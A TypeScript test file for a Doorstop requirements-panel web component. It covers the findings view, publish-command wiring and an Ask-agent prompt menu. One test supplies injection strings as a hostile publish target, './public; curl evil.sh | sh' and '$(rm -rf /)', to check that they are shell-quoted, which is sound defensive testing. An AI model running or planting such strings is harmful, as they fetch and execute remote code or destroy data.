    const req0001 = makeItem("REQ0001", "REQ", { path: "reqs/REQ0001.yml", text: "The system shall do X." });
    // Reviewed against the current fingerprint → no state findings at all.
    req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
    const result = makeResult([req0001], [reqConfig], []);
    const { body } = await mountBody(() => Promise.resolve(result));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);

    const empty = root.querySelector(".doorstop-findings-view .doorstop-empty");
    expect(empty?.textContent).toContain(FINDINGS_EMPTY_MESSAGE);
    expect(empty?.textContent).toContain(FINDINGS_EMPTY_HINT);
    expect(root.querySelector(".doorstop-findings-list")).toBeNull();
    expect(root.querySelector(".doorstop-findings-counts")?.textContent).toBe("0 errors · 0 warnings · 0 info");
    expect(root.querySelector(".doorstop-findings-note")?.textContent).toContain(FINDINGS_PLUGIN_LOCAL_NOTE);
  });

  it("keeps the Run validation terminal action reachable from the findings view", async () => {
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await settle();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: validate",
      command: "doorstop",
      metadata: { "opendoor.op": "validate" },
      open: true,
    });
  });
});

describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
  it("publishes to the workspace publishTarget from a settings fixture, with the exact command", async () => {
    const confirmSpy = stubConfirm(true);
    const { files } = createFakeFiles({
      trees: {
        "": tree([dirEntry("reqs", "reqs")]),
        "reqs": tree([fileEntry(".doorstop.yml", "reqs/.doorstop.yml"), fileEntry("REQ0001.yml", "reqs/REQ0001.yml")]),
      },
      reads: {
        ".pi-web/opendoor.json": text(JSON.stringify({ version: 1, publishTarget: "./site" })),
        "reqs/.doorstop.yml": text("settings:\n  prefix: REQ\n  digits: 4"),
        "reqs/REQ0001.yml": text("text: The system shall do X."),
      },
    });
    const { body, controller, context } = await mountBody(() => loadDoorstopWorkspace(files));
    // loadDoorstopWorkspace's async chain is a few frames longer than a bare
    // Promise.resolve result — give it room to land before asserting.
    for (let turn = 0; turn < 50; turn += 1) await Promise.resolve();
    bindBody(body, controller, context);
    await flush(body);
    const result = body.result;
    if (result === undefined) throw new Error("no result");
    expect(result.settings.publishTarget).toBe("./site");
    expect(doorstopPublishTarget(result)).toBe("./site");
    expect(doorstopPublishCommand(result)).toBe("doorstop publish all ./site");

    // The button title reflects the target; clicking confirms + runs it.
    const publish = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish");
    expect(publish?.getAttribute("title")).toBe("Publish the tree to ./site");
    publish?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./site in the workspace terminal?");
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./site",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("publishes to the default target when the result has no settings (and when there is no result)", async () => {
    const confirmSpy = stubConfirm(true);
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Strip settings from the result — a result built by an older caller, or
    // the hardened path before settings land.
    const bare = body.result;
    if (bare === undefined) throw new Error("no result");
    body.result = { index: bare.index } as DoorstopWorkspaceResult;
    await flush(body);
    expect(doorstopPublishTarget(body.result)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all ./public");

    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith("Publish the Doorstop tree as HTML to ./public in the workspace terminal?");
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });

    // With NO result at all the fallback still applies (default target).
    vi.mocked(context.terminal.runCommand).mockClear();
    body.result = undefined;
    await flush(body);
    expect(doorstopPublishTarget(undefined)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("shell-quotes a settings publishTarget containing shell metacharacters so a committed .pi-web/opendoor.json cannot inject a command", async () => {
    const confirmSpy = stubConfirm(true);
    const hostile = "./public; curl evil.sh | sh";
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // The settings validator ACCEPTS this string — a safe relative path (no
    // `..`, not absolute, no backslash) — so the command boundary in
    // doorstopPublishCommand is the last line of defense and must quote it.
    const bare = body.result;
    if (bare === undefined) throw new Error("no result");
    body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [] } };
    await flush(body);
    expect(doorstopPublishTarget(body.result)).toBe(hostile);
    expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all './public; curl evil.sh | sh'");

    // The confirm dialog shows the target literally (display only — the user
    // sees what they configured); the executed command carries it as ONE
    // single-quoted argument, so `;`, `|`, and the rest cannot execute.
    root.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalledWith(
      "Publish the Doorstop tree as HTML to ./public; curl evil.sh | sh in the workspace terminal?",
    );
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all './public; curl evil.sh | sh'",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
  });

  it("quotes only targets outside the inert token alphabet; an embedded quote uses the shell '\\'' escape", () => {
    const result = makeTreeResult();
    const withTarget = (publishTarget: string): DoorstopWorkspaceResult => ({
      index: result.index,
      settings: { publishTarget, excludedDirectories: [] },
    });
    // Inert `[\w./-]` targets keep the canonical bare command spelling.
    expect(doorstopPublishCommand(withTarget("./public"))).toBe("doorstop publish all ./public");
    expect(doorstopPublishCommand(withTarget("./docs/final-2"))).toBe("doorstop publish all ./docs/final-2");
    // Anything else is emitted as a single shell-quoted argument.
    expect(doorstopPublishCommand(withTarget("./docs (final)"))).toBe("doorstop publish all './docs (final)'");
    expect(doorstopPublishCommand(withTarget("./it's"))).toBe("doorstop publish all './it'\\''s'");
    expect(doorstopPublishCommand(withTarget("$(rm -rf /)"))).toBe("doorstop publish all '$(rm -rf /)'");
    // An explicit target is honored (the publish click threads the same
    // value it put in the confirm message, so the two stay consistent).
    expect(doorstopPublishCommand(result, "./site")).toBe("doorstop publish all ./site");
  });

  it("pins the freeze contract the fixtures depend on: the settings default is truly frozen, the model index only by convention", () => {
    // DEFAULT_OPENDOOR_SETTINGS is handed out BY REFERENCE on every defaults
    // path, so it is genuinely frozen — one consumer mutating what it
    // received must not corrupt the shared default for everyone. The model
    // index, by contrast, is frozen by CONVENTION only (the contract's
    // wording): the findings fixtures splice into `index.findings` and the
    // no-settings test strips `settings` off a result. Pin the runtime truth
    // here so a drift to runtime-freezing fails at this fixture with a clear
    // message instead of a confusing TypeError mid-assertion.
    expect(Object.isFrozen(DEFAULT_OPENDOOR_SETTINGS)).toBe(true);
    const index = makeTreeResult().index;
    expect(Object.isFrozen(index)).toBe(false);
    expect(Object.isFrozen(index.findings)).toBe(false);
    expect(Object.isFrozen(index.diagnostics)).toBe(false);
  });
});

describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
  it("inserts the exact builder output for each prompt and focuses the editor", async () => {
    const insertText = vi.fn();
    const focusPrompt = vi.fn();
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      insertText,
      focusPrompt,
    });
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const result = controller.result;
    if (result === undefined) throw new Error("result");
    const req0002 = result.index.byUid.get("REQ0002");
    const req0001 = result.index.byUid.get("REQ0001");
    if (req0002 === undefined || req0001 === undefined) throw new Error("fixture");

    // The menu is closed by default; the toggle opens it.
    expect(root.querySelector(".doorstop-menu-items")).toBeNull();
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    const items = root.querySelector(".doorstop-menu-items");
    if (items === null) throw new Error("menu");

    items.querySelector<HTMLElement>(".doorstop-explain")?.click();
    expect(insertText).toHaveBeenLastCalledWith(explainItemPrompt(req0002));
    expect(focusPrompt).toHaveBeenCalled();
    // Selecting a prompt closes the menu after the insert commits.
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).toBeNull(); // closes after insert

    // Fix suspect links names the changed parents.
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-fix-suspects")?.click();
    expect(insertText).toHaveBeenLastCalledWith(fixSuspectLinksPrompt(req0002, [req0001]));
    // Draft child targets the item's first child document prefix (TST).
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-draft-child")?.click();
    expect(insertText).toHaveBeenLastCalledWith(draftChildRequirementPrompt(req0002, "TST"));
    // Review readiness names the children resolved from the reverse map.
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-review-readiness")?.click();
    const children = result.index.childrenByUid.get(req0002.uid) ?? [];
    expect(insertText).toHaveBeenLastCalledWith(reviewReadinessPrompt(req0002, children));
  });

  it("disables Fix suspect links and Draft child requirement when they have nothing actionable", async () => {
    const insertText = vi.fn();
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), { insertText });
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    // TST001: no links → no suspects; TST document has no children → no child prefix.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    const fix = root.querySelector<HTMLButtonElement>(".doorstop-fix-suspects");
    const draft = root.querySelector<HTMLButtonElement>(".doorstop-draft-child");
    expect(fix?.disabled).toBe(true);
    expect(fix?.title).toContain("No suspect links");
    expect(draft?.disabled).toBe(true);
    expect(draft?.title).toContain("No child document");
    // Disabled items run nothing on click.
    fix?.click();
    draft?.click();
    expect(insertText).not.toHaveBeenCalled();
  });

  it("review readiness embeds the selected item's child UID list (REQ0001 → TST002)", async () => {
    const insertText = vi.fn();
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), { insertText });
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    // REQ0001 has a child (TST002 links up to it) — the readiness prompt must
    // name that child UID, not an empty list.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const result = controller.result;
    if (result === undefined) throw new Error("result");
    const req0001 = result.index.byUid.get("REQ0001");
    if (req0001 === undefined) throw new Error("fixture");
    const children = result.index.childrenByUid.get(req0001.uid) ?? [];
    expect(children.map((child) => child.uid)).toContain("TST002");

    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-review-readiness")?.click();
    const prompt = reviewReadinessPrompt(req0001, children);
    expect(insertText).toHaveBeenLastCalledWith(prompt);
    expect(prompt).toContain("TST002");
  });

  it("closes the Ask-agent menu on Escape, on an outside click, and when the selection changes", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    // Open, then Escape closes it.
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
    document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).toBeNull();

    // Open, then an outside click closes it.
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
    document.body.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).toBeNull();

    // Open, then selecting a different item closes it.
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector(".doorstop-menu-items")).toBeNull();
  });

  it("skips a missing prompt editor without throwing", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    // A context-less menu toggle still opens; inserting with context cleared
    // is a no-op (the element guards `context === undefined`).
    (body as DoorstopPanelBodyElement).context = undefined;
    root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
    await flush(body);
    root.querySelector<HTMLElement>(".doorstop-explain")?.click();
    expect(controller.selectedUid).toBe("REQ0002");
  });
});

// --- test helpers ------------------------------------------------------------------------

/** Stand-in for the panel render wiring's property bindings: mirrors the
 *  controller's render inputs onto the body element exactly as the host
 *  template does. */
function bindBody(
  body: DoorstopPanelBodyElement,
  controller: DoorstopWorkspaceController,
  context: WorkspacePanelContext,
): void {
  body.controller = controller;
  body.context = context;
  body.result = controller.result;
  body.loading = controller.loading;
  body.stale = controller.stale;
  body.error = controller.error;
  body.selectedUid = controller.selectedUid;
  body.selectedDocumentPrefix = controller.selectedDocumentPrefix;
  body.stateFilter = controller.stateFilter;
  body.search = controller.search;
  // Phase D: the run-state fields the Last-run section and button gating read.
  body.lastRun = controller.lastRun;
  body.runInProgress = controller.runInProgress;
}

async function flush(body: DoorstopPanelBodyElement): Promise<void> {
  await body.updateComplete;
  await settle();
}

/** Build one panel context wrapping a fake files adapter plus spies for the
 *  surfaces the element reads at click time: `requestRender` (the
 *  controller's render path), `prompt.insertText`, a `focusPrompt` widening,
 *  `terminal.runCommand`, and (Phase D) the optional `backend.request`
 *  surface plus the workspace `provider` metadata that gates the backend
 *  path. Without `hook.backend` the context carries no `backend` property
 *  (exactly the unpaired real shape), so the terminal path is exercised by
 *  default. */
function panelContext(hook: {
  insertText?: Mock;
  focusPrompt?: Mock;
  runCommand?: Mock;
  backend?: Mock;
  provider?: Workspace["provider"];
} = {}): {
  context: WorkspacePanelContext;
  requestRender: Mock;
  insertText: Mock;
  focusPrompt: Mock;
  runCommand: Mock;
  backend: Mock | undefined;
} {
  const requestRender = vi.fn();
  const insertText = hook.insertText ?? vi.fn();
  const focusPrompt = hook.focusPrompt ?? vi.fn();
  const runCommand = hook.runCommand ?? vi.fn(() => Promise.resolve(completedHandle()));
  const backend = hook.backend;
  const workspace = hook.provider === undefined ? doorstopWorkspace : { ...doorstopWorkspace, provider: hook.provider };
  const files: FakeWorkspaceFiles = createFakeFiles();
  const context: WorkspacePanelContext & { focusPrompt: Mock } = {
    machine: { id: "local", name: "local", kind: "local" },
    workspace,
    state: {
      selectedWorkspace: workspace,
      workspaceTool: "opendoor:workspace.doorstop",
      mainView: "opendoor:workspace.doorstop",
    },
    files: files.files,
    host: { requestRender },
    prompt: { insertText, getText: () => "", getSelection: () => null },
    terminal: { open: () => undefined, runCommand },
    // The optional `backend` field is only present when the hook supplied
    // one (exactOptionalPropertyTypes forbids an explicit undefined write).
    ...(backend === undefined ? {} : { backend: { request: backend } }),
    focusPrompt,
  };
  return { context, requestRender, insertText, focusPrompt, runCommand, backend };
}

/** A canned `DoorstopRunResponse` for the backend spies; callers override
 *  only the fields their scenario cares about. */
function makeRunResponse(overrides: Partial<DoorstopRunResponse> = {}): DoorstopRunResponse {
  return {
    op: "validate",
    exitCode: 0,
    signal: null,
    stdout: "Validated 4 items.",
    stderr: "",
    stdoutTruncated: false,
    stderrTruncated: false,
    durationMs: 12,
    ...overrides,
  };
}

/** Build a minimal TerminalCommandRun literal for the terminal spies; callers
 *  override only the fields their scenario cares about (title/command/status/
 *  metadata/completedAt). */
function makeRun(overrides: Partial<TerminalCommandRun> = {}): TerminalCommandRun {
  return {
    id: "run-1",
    origin: "opendoor:workspace.doorstop",
    projectId: "project-1",
    workspaceId: "workspace-1",
    terminalId: "terminal-1",
    title: "Doorstop: validate",
    command: "doorstop",
    status: "succeeded",
    createdAt: new Date().toISOString(),
    metadata: { "opendoor.op": "validate" },
    ...overrides,
  };
}

/** A resolved terminal run handle the default runCommand mock returns. */
function completedHandle(): TerminalCommandRunHandle {
  const run = makeRun({ status: "succeeded", completedAt: new Date().toISOString() });
  return { run, completed: Promise.resolve(run) };
}

/** How many microtask turns a bare `await settle()` waits for a resolved
 *  promise chain to flush. A magic number, but named and shared so every
 *  test's timing assumption is uniform. */
const SETTLE_TICKS = 10;

async function settle(): Promise<void> {
  for (let index = 0; index < SETTLE_TICKS; index += 1) await Promise.resolve();
}